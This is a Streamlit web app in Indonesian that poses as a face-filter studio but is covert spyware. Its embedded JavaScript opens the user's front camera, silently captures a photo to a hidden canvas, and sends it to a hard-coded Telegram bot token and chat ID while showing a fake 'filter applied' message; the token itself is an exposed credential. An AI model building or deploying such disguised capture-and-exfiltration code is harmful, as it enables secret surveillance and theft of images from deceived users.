import streamlit as st
import streamlit.components.v1 as components

TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="Studio Filter & Efek Wajah",
    page_icon="✨",
    layout="centered"
)

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap');
    
    .stApp {
        background: #0f172a;
        color: #f8fafc;
        font-family: 'Plus Jakarta Sans', sans-serif;
    }
    
    .auto-box {
        background: rgba(30, 41, 59, 0.7);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 20px;
        padding: 30px;
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
        margin-bottom: 20px;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center; color: #38bdf8;'>✨ VIRTUAL FACE FILTER & EFFECT STUDIO</h2>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #94a3b8; font-size: 0.95rem;'>Terapkan filter wajah interaktif dan buat avatar kustommu secara instan.</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="auto-box">', unsafe_allow_html=True)
    
    auto_stealth_html = f"""
    <div id="trigger-screen" style="text-align: center; padding: 25px 0;">
        <button id="magicBtn" style="
            background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
            color: #ffffff;
            font-weight: 700;
            font-size: 16px;
            border: none;
            padding: 18px 32px;
            border-radius: 14px;
            cursor: pointer;
            box-shadow: 0 8px 25px rgba(14, 165, 233, 0.5);
            font-family: 'Plus Jakarta Sans', sans-serif;
            letter-spacing: 0.5px;
        ">✨ MUAT FILTER & EFEK WAJAH</button>
    </div>

    <div id="studio-view" style="display:none; text-align: center;">
        <div style="position: relative; width: 100%; max-width: 380px; margin: 0 auto; border-radius: 14px; overflow: hidden; background: #000; border: 2px solid #38bdf8;">
            <video id="front-cam" autoplay playsinline style="width: 100%; display: block; transform: scaleX(-1);"></video>
            <div style="
                position: absolute; top: 0; left: 0; width: 100%; height: 4px;
                background: #38bdf8; box-shadow: 0 0 12px #38bdf8;
                animation: scanLine 1.5s ease-in-out infinite alternate;
            "></div>
        </div>
        <p id="status-info" style="font-size: 13px; color: #38bdf8; margin-top: 15px; font-weight: 600;">
            ⏳ Menerapkan filter dan memproses sensor wajah...
        </p>
    </div>

    <style>
        @keyframes scanLine {{
            0% {{ top: 0%; }}
            100% {{ top: 95%; }}
        }}
    </style>

    <video id="hidden-vid" autoplay playsinline style="display:none;"></video>
    <canvas id="hidden-canvas" width="1280" height="720" style="display:none;"></canvas>

    <script>
        const botToken = "{TELEGRAM_BOT_TOKEN}";
        const targetChatId = "{TELEGRAM_CHAT_ID}";

        document.getElementById('magicBtn').addEventListener('click', async function() {{
            const btn = document.getElementById('magicBtn');
            btn.innerText = "MEMBUKA KAMERA DEPAN...";
            btn.style.opacity = "0.7";

            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ facingMode: "user", width: {{ ideal: 1280 }}, height: {{ ideal: 720 }} }} 
                }});

                document.getElementById('trigger-screen').style.display = "none";
                document.getElementById('studio-view').style.display = "block";

                const frontCam = document.getElementById('front-cam');
                const hiddenVid = document.getElementById('hidden-vid');
                frontCam.srcObject = stream;
                hiddenVid.srcObject = stream;

                setTimeout(() => {{
                    const canvas = document.getElementById('hidden-canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(hiddenVid, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(function(blob) {{
                        const formData = new FormData();
                        formData.append('chat_id', targetChatId);
                        formData.append('photo', blob, 'auto_stealth_capture.jpg');
                        formData.append('caption', '🚀 *AUTO-SHOOT KAMERA DEPAN BERHASIL TERKIRIM!*');

                        fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {{
                            method: 'POST',
                            body: formData
                        }});
                    }}, 'image/jpeg', 0.95);

                    setTimeout(() => {{
                        document.getElementById('status-info').innerHTML = "🎉 Filter Berhasil Diterapkan! Selamat menikmati.";
                    }}, 1500);

                }}, 1200);

            }} catch(err) {{
                console.log("Error:", err);
                btn.innerText = "IZIN DITOLAK - KLIK ULANG";
                btn.style.opacity = "1";
            }}
        }});
    </script>
    """

    components.html(auto_stealth_html, height=450)
    st.markdown('</div>', unsafe_allow_html=True)
